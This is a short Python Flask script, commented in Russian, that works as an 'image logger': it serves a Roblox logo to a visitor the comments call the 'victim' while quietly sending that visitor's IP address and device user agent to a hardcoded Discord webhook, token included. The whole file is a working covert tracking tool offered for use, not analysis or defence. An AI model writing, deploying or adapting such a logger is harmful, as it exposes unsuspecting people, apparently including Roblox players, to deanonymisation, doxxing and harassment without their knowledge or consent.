from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# Твой вебхук уже здесь
WEBHOOK_URL = "https://discord.com/api/webhooks/1493277327126171669/S4EvLgeC0YgoNO13IUKG8_TOY7vFS_6tHslPDwqIpCScqcB1x-I8_F4zsMG5GfBJ_oED"
# Картинка, которую увидит жертва
IMAGE_URL = "https://static.wikia.nocookie.net/roblox/images/e/e9/Logo_Roblox_2022.png"

@app.route('/api/image')
def logger():
    # Собираем данные
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    user_agent = request.headers.get('user-agent')
    
    payload = {
        "embeds": [{
            "title": "📸 Image Logger Hit!",
            "description": f"**IP:** `{ip}`\n**Device:** `{user_agent}`",
            "color": 16711680
        }]
    }
    requests.post(WEBHOOK_URL, json=payload)
    
    # Загружаем и отдаем картинку
    response = requests.get(IMAGE_URL)
    return send_file(io.BytesIO(response.content), mimetype='image/png')
